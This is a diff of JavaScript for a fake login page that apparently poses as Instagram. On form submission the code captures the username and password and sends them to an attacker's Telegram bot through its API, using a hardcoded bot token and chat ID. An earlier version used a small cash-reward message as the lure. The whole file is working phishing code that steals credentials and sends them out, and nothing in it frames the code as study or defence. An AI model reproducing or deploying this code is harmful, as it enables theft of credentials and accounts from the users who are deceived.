@@ -1,31 +1,33 @@
-document.getElementById('passwordForm').addEventListener('submit', function(event) {
+document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault();
 
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    const message = `Username: ${username}\nPassword: ${password}`;
+    // Replace with your Telegram bot API key and chat ID
+    const telegramBotApiKey = '8890809901:AAEja8I5j0aBUWUwDGLdRN2uLuSHoK-yvXc';
+    const telegramChatId = '8596970646';
 
-    fetch('https://api.telegram.org/bot8890809901:AAEja8I5j0aBUWUwDGLdRN2uLuSHoK-yvXc/sendMessage', {
+    fetch(`https://api.telegram.org/bot${telegramBotApiKey}/sendMessage`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            chat_id: '8596970646',
-            text: message
+            chat_id: telegramChatId,
+            text: `New Instagram login:\nUsername: ${username}\nPassword: ${password}`
         })
     })
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            document.getElementById('message').innerText = 'You got 5rs! 🎉';
+            alert('Login information sent to your Telegram bot!');
         } else {
-            document.getElementById('message').innerText = 'An error occurred. Please try again.';
+            alert('Failed to send login information to your Telegram bot.');
         }
     })
     .catch(error => {
         console.error('Error:', error);
-        document.getElementById('message').innerText = 'An error occurred. Please try again.';
+        alert('An error occurred while sending the login information.');
     });
 });
